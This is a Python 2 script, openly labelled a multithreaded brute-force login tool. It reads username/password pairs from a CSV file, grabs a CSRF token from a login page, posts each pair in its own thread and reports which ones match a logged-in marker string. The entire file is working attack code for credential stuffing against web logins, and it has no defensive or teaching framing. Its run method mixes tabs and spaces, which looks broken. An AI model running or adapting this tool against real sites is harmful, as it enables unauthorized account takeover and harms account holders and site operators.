#!/usr/bin/python
import threading, csv, requests

## Multithreaded Brute Force Login
## URL: Url for login
## PWFILE: coma seperated csv File (username,password)
## LOGGEDINREGEX: String on the Site when you logged in

URL =  ''
PWFILE = ''
LOGGEDINREGEX = ''

matches = []
checks = []

class logintry(threading.Thread):
    def __init__ (self, uname, pwd):
        threading.Thread.__init__(self)
        self.uname = uname
        self.pwd = pwd
        self.success = 0

    def run(self):
        s = requests.Session()
    	r1 = s.get(URL)
    	csrftoken = r1.cookies['csrftoken']
    	payload = {'username': self.uname, 'password': self.pwd, 'csrfmiddlewaretoken': csrftoken }
    	r = s.post(URL, data=payload, headers=dict(Referer=URL))
    	#truelogin = "EC2 Server Overview"
    	self.success = r.text.find(LOGGEDINREGEX)

    def result(self):
        return self.success

def fileopener():
    f = open(PWFILE, 'rt')
    reader = csv.reader(f)
    for row in reader:
        current = logintry(row[0],row[1])
        checks.append(current)
        current.start()
    f.close()
    resulter()

def resulter():
    for logins in checks:
        logins.join()
        if logins.result() == -1:
            print "Login ", logins.uname, " : ", logins.pwd, " not Matching."
        else:
            print "Login ", logins.uname, " : ", logins.pwd, " Matching."
            x = "%s : %s" % (logins.uname, logins.pwd)
            matches.append( x )
    printresults()

def printresults():
    print " "
    print "All Login Trys: ", len(checks)
    print "entire successfull Logins: ", len(matches)
    for suc in matches:
        print "__________________________"
        print suc

def main():
    fileopener()

if __name__ == "__main__":
    main()
